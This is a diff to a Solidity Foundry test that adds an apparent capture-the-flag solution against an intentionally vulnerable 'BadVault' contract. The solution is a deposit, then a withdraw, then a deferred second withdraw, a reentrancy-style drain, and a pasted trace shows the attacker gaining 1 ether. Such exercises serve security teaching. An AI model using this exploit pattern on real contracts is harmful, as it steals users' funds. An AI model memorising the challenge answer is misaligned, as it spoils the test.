@@ -175,4 +175,40 @@ contract BadVaultTest is Test {
         // console2.log("attacker final balance", address(attacker).balance);
         assert(attacker.balance <= STARTING_BALANCE);
     }
+
+    // running `forge test --match-test test_BadVault_solution -vvv` confirms the attack trace:
+    //took 6s Node system at 18:00:43
+    //   deposit 0x0000000000000000000000000000000000000001 1000000000000000000
+    //   deposit 0x0000000000000000000000000000000000000002 1000000000000000000
+    //   attacker starting balance 2000000000000000000
+    //   deposit 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
+    //   withdraw 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
+    //   withdraw 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
+    //   attacker final balance 3000000000000000000
+    function test_BadVault_solution() public {
+        prove_BadVault_usingExploitLaunchPad(
+            // 1st call
+            address(vault),
+            1 ether,
+            abi.encodeWithSelector(
+                vault.deposit.selector
+            ),
+
+            // 2nd call
+            address(vault),
+            0 ether,
+            abi.encodeWithSelector(
+                vault.withdraw.selector,
+                1 ether
+            ),
+
+            // deferred call
+            address(vault),
+            0 ether,
+            abi.encodeWithSelector(
+                vault.withdraw.selector,
+                1 ether
+            )
+        );
+    }
 }
